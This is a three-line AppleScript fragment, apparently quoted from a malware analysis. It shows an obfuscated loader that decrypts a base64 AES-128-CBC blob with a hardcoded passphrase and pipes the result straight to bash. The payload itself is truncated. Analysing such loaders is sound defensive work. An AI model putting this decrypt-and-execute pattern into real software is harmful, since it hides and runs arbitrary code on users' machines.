-- AES-128 CBC decryption with hardcoded passphrase
set aes to "U2FsdGVkX1/..." -- (base64 encrypted shell command)
do shell script "echo " & aes & " | openssl enc -aes-128-cbc -a -d -pass pass:s3cr3t | bash"
